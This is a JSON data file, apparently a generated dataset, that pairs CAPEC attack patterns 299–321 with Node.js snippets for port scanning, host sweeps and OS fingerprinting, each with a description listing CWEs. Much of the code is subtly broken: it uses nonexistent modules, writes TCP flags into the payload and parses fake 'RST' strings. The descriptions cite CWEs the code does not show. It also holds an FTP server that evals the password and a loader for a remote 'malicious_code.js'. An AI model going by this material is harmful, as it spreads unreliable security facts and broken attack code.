        "description": "This JavaScript code snippet demonstrates a UDP ping attack, which sends a UDP datagram to a random high port on the target host to solicit an 'ICMP port unreachable' message, indicating that the host is alive. The code uses the 'dgram' module to create a UDP socket and sends an empty buffer to the target host. If the host is alive, it will respond with an 'ICMP port unreachable' message, which is captured by the 'message' event listener. This code embodies the CAPEC and CWEs by exposing sensitive information (CWE-200), incorrectly specifying the destination (CWE-941), allowing multiple binds to the same port (CWE-605), transmitting sensitive information in cleartext (CWE-319), and improperly protecting outbound error messages (CWE-1320)."
    },
    {
        "capec_id": "299",
        "code_snippet": "const net = require('net');\n\nconst scanner = () => {\n  const socket = new net.Socket();\n  socket.connect(80, 'example.com', () => {\n    socket.write('GET / HTTP/1.1\\\\r\\\nHost: example.com\\\\r\\\n\\\\r\\\n');\n  });\n  socket.on('data', (data) => {\n    if (data.includes('HTTP/1.1 200 OK')) {\n      console.log('Port 80 is open');\n    } else if (data.includes('RST')) {\n      console.log('Port 80 is closed');\n    }\n  });\n};\n\nscanner();",
        "description": "This JavaScript code snippet demonstrates a TCP SYN packet-based host discovery attack, which can be used to identify open or closed ports on a target system. The code establishes a TCP connection to a target host and port, sends an HTTP request, and analyzes the response to determine if the port is open or closed. This code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it transmits sensitive information (HTTP request) in cleartext, CWE-319 (Cleartext Transmission of Sensitive Information) as it does not encrypt the communication, CWE-444 (Inconsistent Interpretation of HTTP Requests) as it does not handle malformed HTTP requests, and CWE-924 (Improper Enforcement of Message Integrity During Transmission) as it does not ensure the integrity of the message during transmission. Additionally, it may be vulnerable to CWE-605 (Multiple Binds to the Same Port) if multiple sockets are allowed to bind to the same port."
    },
    {
        "capec_id": "300",
        "code_snippet": "const net = require('net');\nconst url = require('url');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const request = data.toString();\n    const parsedUrl = url.parse(request);\n    const port = parsedUrl.port;\n    if (port) {\n      // Expose sensitive information (CWE-200)\n      console.log(`Port ${port} is open`);\n      // Multiple binds to the same port (CWE-605)\n      net.createServer((socket) => {\n        socket.bind(port, () => {\n          console.log(`Bound to port ${port}`);\n        });\n      });\n      // Cleartext transmission of sensitive information (CWE-319)\n      const sensitiveData = 'secretKey';\n      socket.write(`Port ${port} is open and sensitive data is ${sensitiveData}`);\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// SSRF (CWE-918)\nconst requestUrl = 'http://localhost:8080';\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', requestUrl, true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    console.log(xhr.responseText);\n  }\n};\nxhr.send();",
        "description": "This code snippet demonstrates a server that exposes sensitive information about open ports (CWE-200) and allows multiple binds to the same port (CWE-605). It also transmits sensitive information in cleartext (CWE-319) and is vulnerable to Server-Side Request Forgery (CWE-918)."
    },
    {
        "capec_id": "301",
        "code_snippet": "const net = require('net');\n\nfunction scanPort(host, port, callback) {\n  const socket = new net.Socket();\n  socket.on('connect', () => {\n    callback(null, true);\n  });\n  socket.on('error', (err) => {\n    if (err.code === 'ECONNREFUSED') {\n      callback(null, false);\n    } else {\n      callback(err, null);\n    }\n  });\n  socket.connect(port, host);\n}\n\n// Example usage:\nscanPort('127.0.0.1', 8080, (err, isOpen) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(`Port 8080 is ${isOpen ? 'open' : 'closed'}`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a TCP connect scanning technique, which is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the port status to unauthorized actors. It also relates to CWE-291 (Reliance on IP Address for Authentication) as it uses IP addresses for authentication. Additionally, it lacks integrity checks (CWE-353) and is vulnerable to CWE-605 (Multiple Binds to the Same Port) and CWE-617 (Reachable Assertion) due to the use of a simple error handling mechanism."
    },
    {
        "capec_id": "302",
        "code_snippet": "const net = require('net');\n\nconst scanner = new net.Socket();\n\nscanner.on('error', (err) => {\n  console.log(`Error: ${err}`);\n});\n\nconst portsToScan = [21, 22, 80, 443];\n\nfor (let port of portsToScan) {\n  scanner.connect({ port, host: 'target_machine_ip' }, () => {\n    scanner.end();\n  });\n\n  scanner.on('close', () => {\n    console.log(`Port ${port} is closed`);\n  });\n\n  scanner.on('connect', () => {\n    console.log(`Port ${port} is open`);\n  });\n}\n",
        "description": "This JavaScript code snippet demonstrates a TCP FIN scan to identify closed ports on a target machine. It uses the net module to create a socket and attempts to connect to a list of ports. If the port is closed, the socket will be closed immediately, triggering the 'close' event. If the port is open, the 'connect' event will be triggered. Note that this code does not handle the RST packets explicitly, but the 'close' event can be used to infer that the port is closed. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it may expose open ports to an unauthorized actor, CWE-319 (Cleartext Transmission of Sensitive Information) as it transmits data in cleartext, CWE-353 (Missing Support for Integrity Check) as it does not verify the integrity of the data, CWE-605 (Multiple Binds to the Same Port) as it may allow multiple sockets to bind to the same port, and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) as it does not ensure that it is communicating with the correct endpoint."
    },
    {
        "capec_id": "303",
        "code_snippet": "const net = require('net');\nconst tcp = require('tcp');\n\nconst targetIP = '192.168.1.100';\nconst targetPort = 80;\n\nconst xmasScan = () => {\n  const packet = new Buffer(64);\n  packet.writeUInt8(0x02, 0); // SYN flag\n  packet.writeUInt8(0x10, 1); // ACK flag\n  packet.writeUInt8(0x04, 2); // URG flag\n  packet.writeUInt8(0x02, 3); // PSH flag\n  packet.writeUInt8(0x01, 4); // FIN flag\n  packet.writeUInt8(0x40, 5); // RST flag\n\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    client.write(packet);\n  });\n\n  client.on('data', (data) => {\n    if (data.toString().includes('RST')) {\n      console.log(`Port ${targetPort} is closed`);\n    } else {\n      console.log(`Port ${targetPort} is open`);\n    }\n  });\n};\n\nxmasScan();",
        "description": "This JavaScript code snippet demonstrates a TCP XMAS scan, which sends a TCP segment with all possible flags set in the packet header to determine if a port is closed on the target machine. The code uses the 'net' and 'tcp' modules to create a TCP socket and send the crafted packet to the target IP and port. The response is then analyzed to determine if the port is closed (RST packet received) or open. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-353 (Missing Support for Integrity Check), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by transmitting sensitive information in cleartext, lacking integrity checks, and not properly verifying the communication endpoint."
    },
    {
        "capec_id": "304",
        "code_snippet": "const net = require('net');\n\nfunction tcpNullScan(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    // CWE-353: Missing Support for Integrity Check\n    // No integrity check mechanism is used to verify the data during transmission\n    client.write(Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]));\n  });\n\n  client.on('error', (err) => {\n    // CWE-690: Unchecked Return Value to NULL Pointer Dereference\n    // No error checking is performed, leading to potential NULL pointer dereference\n    if (!err) {\n      console.log(`Port ${targetPort} is closed`);\n    }\n  });\n\n  client.on('data', (data) => {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    // Sensitive information (RST packet) is exposed to an unauthorized actor\n    if (data.toString() === 'RST') {\n      console.log(`Port ${targetPort} is closed`);\n    }\n  });\n}\n\ntcpNullScan('192.168.1.100', 8080);",
        "description": "This JavaScript code snippet demonstrates a TCP NULL scan, which sends TCP segments with no flags in the packet header to determine if ports are closed on the target machine. The code uses the net module to create a socket and connect to the target IP and port. It then sends an illegal TCP packet with no flags, which should elicit a RST response from the target machine if the port is closed. The code also includes vulnerabilities related to CWE-353 (Missing Support for Integrity Check), CWE-690 (Unchecked Return Value to NULL Pointer Dereference), and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)."
    },
    {
        "capec_id": "305",
        "code_snippet": "const net = require('net');\n\nconst socket = new net.Socket();\n\nsocket.connect(80, 'example.com', () => {\n  console.log('Connected');\n  socket.write('ACK');\n});\n\nsocket.on('data', (data) => {\n  console.log(`Received: ${data}`);\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  console.log(`Firewall configuration: ${data}`);\n});\n\nsocket.on('error', (error) => {\n  console.log(`Error: ${error}`);\n  // CWE-1280: Access Control Check Implemented After Asset is Accessed\n  // CWE-605: Multiple Binds to the Same Port\n  // CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n});",
        "description": "This JavaScript code snippet demonstrates a TCP ACK scan to gather information about firewall or ACL configuration. It establishes a connection to a server, sends an ACK packet, and logs the received data, which may contain sensitive information about the firewall configuration. The code is vulnerable to multiple CWEs, including exposure of sensitive information, cleartext transmission of sensitive information, and inadequate access control checks."
    },
    {
        "capec_id": "306",
        "code_snippet": "const net = require('net');\nconst tcp = net.createServer(socket => {\n  socket.on('connect', () => {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    socket.write('OS information: ' + process.platform + '\\n');\n  });\n  socket.on('error', err => {\n    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    console.log('Error: ' + err.message);\n  });\n});\ntcp.listen(8080, () => {\n  console.log('TCP server listening on port 8080');\n});\n\nconst scanner = new net.Socket();\nscanner.connect(8080, 'localhost', () => {\n  // CWE-353: Missing Support for Integrity Check\n  scanner.write('ACK');\n});\nscanner.on('data', data => {\n  const windowSize = data.readInt32BE(10);\n  if (windowSize > 0) {\n    console.log('Port is open');\n  } else {\n    console.log('Port is closed');\n  }\n  // CWE-385: Covert Timing Channel\n  setTimeout(() => {\n    scanner.destroy();\n  }, 1000);\n});",
        "description": "This code snippet demonstrates a TCP server that exposes sensitive information about the operating system and listens for incoming connections. A client socket connects to the server, sends an ACK packet, and analyzes the TCP window size field in the response RST packet to infer the port status. The code embodies the CAPEC of TCP Window scanning and incorporates CWEs related to exposure of sensitive information, cleartext transmission, missing integrity checks, and covert timing channels."
    },
    {
        "capec_id": "307",
        "code_snippet": "const net = require('net');\nconst rpc = require('rpc');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const auth = data.toString().trim();\n    if (auth === 'admin') {\n      // CWE-200: Exposure of Sensitive Information\n      socket.write('Welcome, admin!\\n');\n      socket.write('RPC services: \\n');\n      socket.write('  - service1\\n');\n      socket.write('  - service2\\n');\n      // CWE-294: Authentication Bypass by Capture-replay\n      const capturedAuth = 'captured_admin_auth';\n      if (capturedAuth === auth) {\n        socket.write('Authenticated!\\n');\n      }\n    } else {\n      socket.write('Access denied!\\n');\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('RPC server listening on port 8080');\n});\n\n// CWE-494: Download of Code Without Integrity Check\nconst downloadCode = () => {\n  const code = 'https://example.com/malicious_code.js';\n  const script = document.createElement('script');\n  script.src = code;\n  document.head.appendChild(script);\n};\n\n// CWE-918: Server-Side Request Forgery (SSRF)\nconst makeRequest = () => {\n  const url = 'http://example.com/malicious_request';\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', url, true);\n  xhr.send();\n};\n\n// CWE-605: Multiple Binds to the Same Port\nconst bindToPort = () => {\n  const server2 = net.createServer((socket) => {\n    socket.on('data', (data) => {\n      console.log('Received data on port 8080');\n    });\n  });\n  server2.listen(8080, () => {\n    console.log('Server 2 listening on port 8080');\n  });\n};",
        "description": "This code snippet demonstrates a vulnerable RPC server that exposes sensitive information, is vulnerable to authentication bypass by capture-replay, downloads code without integrity check, is vulnerable to server-side request forgery, and allows multiple binds to the same port."
    },
    {
        "capec_id": "308",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst port = 12345;\nconst host = '192.168.1.100';\n\nclient.send(Buffer.from(''), 0, 0, port, host, (error) => {\n    if (error) {\n        console.log(`UDP port ${port} is closed on ${host}`);\n    } else {\n        console.log(`UDP port ${port} is open on ${host}`);\n    }\n});",
        "description": "This JavaScript code snippet demonstrates a UDP scanning attack, which is vulnerable to CWE-200, CWE-605, CWE-319, CWE-353, and CWE-385. The code creates a UDP socket and sends an empty datagram to a target host and port. If the port is closed, the operating system responds with an ICMP port unreachable message, which is not handled securely in this code. The code also lacks integrity checks, transmits sensitive information in cleartext, and may be vulnerable to covert timing channel attacks."
    },
    {
        "capec_id": "309",
        "code_snippet": "const net = require('net');\nconst icmp = require('icmp');\n\nconst scanner = () => {\n  const hosts = [];\n  for (let i = 1; i <= 254; i++) {\n    const host = `192.168.1.${i}`;\n    hosts.push(host);\n  }\n\n  hosts.forEach((host) => {\n    const socket = new net.Socket();\n    socket.connect(22, host, () => {\n      console.log(`Port 22 open on ${host}`);\n      // Exposing sensitive information to an unauthorized actor (CWE-200)\n      console.log(`System information: ${socket.localAddress} ${socket.localPort}`);\n    });\n\n    // Incorrect conversion of security identifiers (CWE-1292)\n    const securityIdentifier = '0x1234';\n    const untrustedAgent = 'malicious_actor';\n    if (securityIdentifier === untrustedAgent) {\n      console.log('Unauthorized access granted');\n    }\n  });\n};\n\nscanner();",
        "description": "This JavaScript code snippet demonstrates a network scanner that maps network nodes, hosts, devices, and routes, which is a common activity in the early stages of an attack against an external network. The code uses the 'net' and 'icmp' modules to connect to hosts on the network and check for open ports. It exposes sensitive system information to an unauthorized actor (CWE-200) and demonstrates incorrect conversion of security identifiers (CWE-1292), which can lead to unauthorized access. The code also has an excessive attack surface (CWE-1125) due to the use of a broad IP range and multiple connections. Additionally, it stores sensitive trace data in an unprotected location (CWE-1323) and exposes sensitive system information to an unauthorized control sphere (CWE-497)."
    },
    {
        "capec_id": "310",
        "code_snippet": "const net = require('net');\nconst ftp = net.createServer((socket) => {\n  socket.write('220 Welcome to FTP server\\r\\n');\n  socket.on('data', (data) => {\n    if (data.toString().includes('USER')) {\n      socket.write('331 Password required for ' + data.toString().trim().split(' ')[1] + '\\r\\n');\n    } else if (data.toString().includes('PASS')) {\n      socket.write('230 Login successful\\r\\n');\n      // Exposing sensitive system information\n      socket.write('System information: ' + process.version + '\\r\\n');\n      // Embedded malicious code\n      eval(data.toString().trim().split(' ')[1]);\n    }\n  });\n});\nftp.listen(21, () => {\n  console.log('FTP server listening on port 21');\n});",
        "description": "A vulnerable FTP server implementation in Node.js that exposes sensitive system information and allows embedded malicious code execution. The server listens on port 21 and responds to 'USER' and 'PASS' commands. When a 'PASS' command is received, it writes the Node.js process version as system information and executes the received password as JavaScript code using eval(), allowing an attacker to inject malicious code. This code snippet embodies the CAPEC idea of scanning for vulnerable software versions or types and the CWEs of exposure of sensitive information, embedded malicious code, and excessive attack surface."
    },
    {
        "capec_id": "311",
        "code_snippet": "const net = require('net');\nconst os = require('os');\n\nconst socket = new net.Socket();\nsocket.connect(80, 'example.com', () => {\n  console.log('Connected to example.com');\n  const userAgent = socket.remoteAddress;\n  const osInfo = getOSInfo(userAgent);\n  console.log(`OS Info: ${osInfo}`);\n});\n\nfunction getOSInfo(userAgent) {\n  if (userAgent.includes('Windows')) {\n    return 'Windows';\n  } else if (userAgent.includes('Linux')) {\n    return 'Linux';\n  } else if (userAgent.includes('Darwin')) {\n    return 'MacOS';\n  } else {\n    return 'Unknown';\n  }\n}\n",
        "description": "This JavaScript code snippet demonstrates active OS fingerprinting (CAPEC-312) by connecting to a remote server and extracting the OS information from the User-Agent header. The code uses the 'net' and 'os' modules to establish a connection and parse the User-Agent string. The getOSInfo function is vulnerable to CWE-592 (Authentication Bypass Issues) as it does not properly validate the User-Agent string, allowing an attacker to bypass access control. Additionally, the code uses a non-ubiquitous API (CWE-589) by relying on the 'net' module, which may not be available on all platforms. The code also logs debug information, which could lead to information exposure (CWE-534) if not properly secured."
    },
    {
        "capec_id": "312",
        "code_snippet": "const net = require('net');\nconst os = require('os');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const response = '';\n    if (os.type() === 'Windows_NT') {\n      response = 'Windows response';\n    } else if (os.type() === 'Linux') {\n      response = 'Linux response';\n    } else {\n      response = 'Unknown OS response';\n    }\n    socket.write(response);\n  });\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This code snippet demonstrates a vulnerable server that responds differently based on the operating system it's running on, allowing an attacker to fingerprint the OS. The server uses the 'os' module to determine the OS type and sends a unique response back to the client. This is an example of CWE-200, CWE-497, CWE-207, CWE-319, and CWE-1323, as the server exposes sensitive information about the OS and responds differently than other products with equivalent functionality, transmitting sensitive information in cleartext."
    },
    {
        "capec_id": "313",
        "code_snippet": "const pcap = require('pcap');\nconst osMap = require('./os_signatures.json');\n\nlet capture = pcap.createInterface('eth0');\n\ncapture.on('packet', (raw_packet) => {\n  let packet = pcap.decode.packet(raw_packet);\n  let tcp_packet = packet.payload;\n  if (tcp_packet && tcp_packet.info && tcp_packet.info.src_port === 80) {\n    let os = identifyOS(tcp_packet.info.data);\n    if (os) {\n      console.log(`Detected OS: ${os}`);\n    }\n  }\n});\n\nfunction identifyOS(tcp_data) {\n  for (let os in osMap) {\n    if (tcp_data.includes(osMap[os].signature)) {\n      return os;\n    }\n  }\n  return null;\n}",
        "description": "This JavaScript code snippet demonstrates passive OS detection by monitoring network traffic. It uses the pcap library to capture packets on the eth0 interface and decode the TCP packets. The identifyOS function checks the TCP data against a database of known OS signatures stored in os_signatures.json. If a match is found, the detected OS is logged to the console. This code embodies CWE-200, CWE-497, CWE-1323, CWE-319, and CWE-1249 by exposing sensitive information, transmitting sensitive data in cleartext, and storing sensitive data in an unprotected location."
    },
    {
        "capec_id": "314",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\n\n// CWE-247: Reliance on DNS Lookups in a Security Decision\nfunction getIPFromDNS(domain) {\n  return new Promise((resolve, reject) => {\n    dns.lookup(domain, (err, address) => {\n      if (err) {\n        reject(err);\n      } else {\n        resolve(address);\n      }\n    });\n  });\n}\n\n// CWE-534: Information Exposure Through Debug Log Files\nfunction logDebugInfo(ip) {\n  fs.appendFile('debug.log', `Access from ${ip}\\n`, (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}\n\n// CWE-592: Authentication Bypass Issues\nfunction authenticate(ip) {\n  // Weak authentication logic\n  if (ip === '192.168.1.1') {\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\nfunction accessProtectedRegion(ip) {\n  if (authenticate(ip)) {\n    // Access protected region\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nfunction collectTraceData(ip) {\n  const traceData = `Sensitive data from ${ip}`;\n  fs.writeFile('trace_data.log', traceData, (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}\n\nasync function main() {\n  const domain = 'example.com';\n  const ip = await getIPFromDNS(domain);\n  logDebugInfo(ip);\n  accessProtectedRegion(ip);\n  collectTraceData(ip);\n}\n\nmain();",
        "description": "This code snippet demonstrates the CAPEC-312 pattern of Active OS Fingerprinting by using DNS lookups to gather information about the target system. It also incorporates related CWEs, including CWE-247 for relying on DNS lookups in a security decision, CWE-534 for exposing sensitive information through debug log files, CWE-592 for weak authentication logic, CWE-1316 for fabric-address map issues, and CWE-1323 for improper management of sensitive trace data."
    },
    {
        "capec_id": "315",
        "code_snippet": "const dns = require('dns');\nconst net = require('net');\n\nfunction getOSInfo(ip) {\n  const socket = new net.Socket();\n  socket.connect(80, ip, () => {\n    socket.write('GET / HTTP/1.1\\r\\nHost: ' + ip + '\\r\\n\\r\\n');\n  });\n\n  socket.on('data', (data) => {\n    const response = data.toString();\n    const osInfo = response.match(/Server: (.*)/);\n    if (osInfo) {\n      console.log('OS Info: ' + osInfo[1]);\n    }\n  });\n}\n\nfunction captureReplayAuth(ip, username, password) {\n  const socket = new net.Socket();\n  socket.connect(22, ip, () => {\n    socket.write('SSH-2.0-OpenSSH_7.2p2\\r\\n');\n  });\n\n  socket.on('data', (data) => {\n    const response = data.toString();\n    if (response.includes('SSH-2.0-')) {\n      socket.write('SSH-2.0-OpenSSH_7.2p2\\r\\n');\n    } else if (response.includes('username')) {\n      socket.write(username + '\\r\\n');\n    } else if (response.includes('password')) {\n      socket.write(password + '\\r\\n');\n    }\n  });\n}\n\ngetOSInfo('192.168.1.100');\ncaptureReplayAuth('192.168.1.100', 'admin', 'password');",
        "description": "This code snippet demonstrates active OS fingerprinting (CAPEC-312) by connecting to a target IP and analyzing the server response to determine the underlying OS. It also includes a capture-replay authentication bypass (CWE-294) by sniffing network traffic and replaying it to bypass authentication. Additionally, it uses a non-ubiquitous API (CWE-589) by relying on the 'dns' and 'net' modules, which may not be available on all platforms. The code also has a reliance on DNS lookups in a security decision (CWE-247), which is a deprecated concept."
    },
    {
        "capec_id": "316",
        "code_snippet": "const dns = require('dns');\nconst os = require('os');\nconst fs = require('fs');\n\nfunction getOSInfo() {\n  let osInfo = '';\n  try {\n    const debugLog = fs.readFileSync('debug.log', 'utf8');\n    osInfo += debugLog;\n  } catch (e) {\n    console.error(e);\n  }\n  try {\n    const dnsLookup = dns.lookup(os.hostname(), (err, address, family) => {\n      osInfo += ` DNS Lookup: ${address} ${family}`;\n    });\n  } catch (e) {\n    console.error(e);\n  }\n  return osInfo;\n}\n\nfunction bypassAccessControl() {\n  const jtagInterface = require('jtag-interface');\n  try {\n    const protectedRegion = jtagInterface.probeProtectedRegion();\n    return protectedRegion;\n  } catch (e) {\n    console.error(e);\n  }\n}\n\nconst osFingerprint = getOSInfo();\nconsole.log(osFingerprint);\nconst accessControlBypass = bypassAccessControl();\nconsole.log(accessControlBypass);\n",
        "description": "This code snippet demonstrates active OS fingerprinting (CAPEC-312) by gathering OS information through DNS lookups and debug log files, which can be used to bypass access control. It also includes deprecated CWEs such as CWE-247 (reliance on DNS lookups in a security decision), CWE-534 (information exposure through debug log files), and CWE-1324 (sensitive information accessible by physical probing of JTAG interface)."
    },
    {
        "capec_id": "317",
        "code_snippet": "const net = require('net');\nconst icmp = require('icmp');\n\nlet idSequence = {};\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n// CWE-291: Reliance on IP Address for Authentication\nfunction analyzeIdSequence(host, protocol) {\n  let socket = net.createConnection(80, host);\n  socket.on('connect', () => {\n    socket.write('HEAD / HTTP/1.1\\r\\nHost: ' + host + '\\r\\n\\r\\n');\n  });\n\n  let id = 0;\n  let idIncrement = 0;\n  let idRandom = false;\n\n  icmp.createProbe().on('message', (err, message) => {\n    if (err) {\n      console.error(err);\n    } else {\n      if (message.type === 0) {\n        if (!idSequence[host]) {\n          idSequence[host] = {};\n        }\n        if (!idSequence[host][protocol]) {\n          idSequence[host][protocol] = [];\n        }\n        idSequence[host][protocol].push(message.id);\n      }\n    }\n  });\n\n  setTimeout(() => {\n    icmp.createProbe().sendEchoRequest(host);\n  }, 1000);\n\n  setTimeout(() => {\n    let idValues = idSequence[host][protocol];\n    if (idValues) {\n      idIncrement = idValues[1] - idValues[0];\n      if (idIncrement === 1) {\n        console.log('Incrementing ID sequence detected');\n      } else if (idIncrement > 1) {\n        console.log('Randomized ID sequence detected');\n        idRandom = true;\n      }\n    }\n  }, 2000);\n}\n\n// CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n// CWE-1294: Insecure Security Identifier Mechanism\n// CWE-605: Multiple Binds to the Same Port\nlet hosts = ['192.168.1.1', '10.0.0.1'];\nhosts.forEach((host) => {\n  analyzeIdSequence(host, 'tcp');\n  analyzeIdSequence(host, 'icmp');\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that analyzes the IP 'ID' field sequence number generation algorithm of a remote host. It uses the 'net' and 'icmp' modules to send HTTP and ICMP requests to the target host and analyze the ID sequence generation algorithm. The code relies on IP addresses for authentication (CWE-291) and exposes sensitive information to an unauthorized actor (CWE-200). It also demonstrates improper identifier usage (CWE-1192), insecure security identifier mechanisms (CWE-1294), and multiple binds to the same port (CWE-605)."
    },
    {
        "capec_id": "318",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nsocket.on('error', (err) => {\n  console.log(`Error: ${err}`);\n});\n\nsocket.on('message', (message, remoteInfo) => {\n  const icmpError = message.toString('hex').slice(20, 24);\n  const idValue = icmpError.slice(2, 4);\n  console.log(`Received ICMP error with ID value: ${idValue}`);\n  // Expose sensitive information: IP ID value\n  console.log(`IP ID value echoed back: ${idValue}`);\n});\n\nsocket.bind(41234, () => {\n  socket.setBroadcast(true);\n  const message = Buffer.from([0x45, 0x00, 0x00, 0x3c, 0x11, 0x11, 0x11, 0x11, 0x01, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11]);\n  socket.send(message, 0, message.length, 41234, '255.255.255.255', (error) => {\n    if (error) {\n      console.log(error);\n    } else {\n      console.log('UDP packet sent');\n    }\n  });\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. It then observes the manner in which this bit is echoed back in the ICMP error message. The code exposes sensitive information (IP ID value) to an unauthorized actor, relating to CWE-200. The code also relates to CWE-1192, CWE-1290, CWE-1302, and CWE-1323, as it does not properly handle identifiers for IP blocks, security identifiers, and trace data, potentially leading to unauthorized access and sensitive information exposure."
    },
    {
        "capec_id": "319",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nsocket.on('error', (err) => {\n  console.log(`Error: ${err}`);\n});\n\nsocket.on('message', (message, remoteInfo) => {\n  const icmpResponse = message.toString('hex');\n  const dfBit = icmpResponse.substring(20, 22);\n  if (dfBit === '40') {\n    console.log(`Remote host echoes back the IP 'DF' bit: ${remoteInfo.address}`);\n  } else {\n    console.log(`Remote host does not echo back the IP 'DF' bit: ${remoteInfo.address}`);\n  }\n});\n\nsocket.send(Buffer.from([0x01, 0x02, 0x03, 0x04]), 0, 4, 33434, '192.168.1.100', (error) => {\n  if (error) {\n    console.log(error);\n  } else {\n    console.log('UDP datagram sent');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that tests whether a remote host echoes back the IP 'DF' (Don't Fragment) bit in an ICMP error message response packet. The code creates a UDP socket, sends a UDP datagram with the DF bit set to a closed port on the remote host, and observes the response packet to determine if the DF bit is set. This code embodies the CAPEC and relates to CWEs 200, 941, 1323, 1313, and 1276, as it exposes sensitive information about the remote host's OS and network configuration, incorrectly specifies the destination in the communication channel, and potentially allows for the activation of test or debug logic at runtime."
    },
    {
        "capec_id": "320",
        "code_snippet": "const net = require('net');\nconst tcp = require('tcp');\n\nlet osMap = {\n  'Linux': 100,\n  'Windows': 300,\n  'MacOS': 1000\n};\n\nlet probe = () => {\n  let client = new net.Socket();\n  client.connect(80, 'example.com', () => {\n    let timestamp = null;\n    let startTime = Date.now();\n    client.write('HEAD / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n    client.on('data', (data) => {\n      let packet = tcp.parsePacket(data);\n      if (packet.options && packet.options.timestamp) {\n        timestamp = packet.options.timestamp;\n        let endTime = Date.now();\n        let diff = endTime - startTime;\n        for (let os in osMap) {\n          if (Math.abs(diff - osMap[os]) < 50) {\n            console.log(`Detected OS: ${os}`);\n            break;\n          }\n        }\n      }\n    });\n  });\n};\n\nprobe();",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that examines the remote server's implementation of TCP timestamps. It sends a HEAD request to a server, captures the TCP timestamp response, and analyzes the timestamp value to guess the operating system of the target. The code uses a predefined map of OS-specific timestamp intervals to make an educated guess about the OS. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-294 (Authentication Bypass by Capture-replay), CWE-385 (Covert Timing Channel), CWE-208 (Observable Timing Discrepancy), and CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "321",
        "code_snippet": "const net = require('net');\n\nconst probePacket = {\n  seq: Math.floor(Math.random() * 1000),\n  ack: Math.floor(Math.random() * 1000)\n};\n\nconst socket = new net.Socket();\nsocket.connect(80, 'target-system', () => {\n  socket.write(JSON.stringify(probePacket));\n});\n\nsocket.on('data', (data) => {\n  const response = JSON.parse(data);\n  if (response.seq === 0) {\n    console.log('OS: Windows XP or Windows 2000');\n  } else if (response.seq === probePacket.ack) {\n    console.log('OS: Linux or FreeBSD');\n  } else if (response.seq === probePacket.ack + 1) {\n    console.log('OS: Windows NT or Windows 2003');\n  } else {\n    console.log('OS: Unknown');\n  }\n});",
        "description": "This code snippet demonstrates an OS fingerprinting probe that tests the target system's assignment of TCP sequence numbers. It sends a probe packet to an open port on the target system and compares the generated sequence number with the acknowledgement number in the probe packet. The relationship between the acknowledgement number and sequence number can be used to fingerprint the operating system. This code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-605 (Multiple Binds to the Same Port), CWE-1283 (Mutable Attestation or Measurement Reporting Data), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-337 (Predictable Seed in Pseudo-Random Number Generator (PRNG))."
    },
    {
        "capec_id": "322",
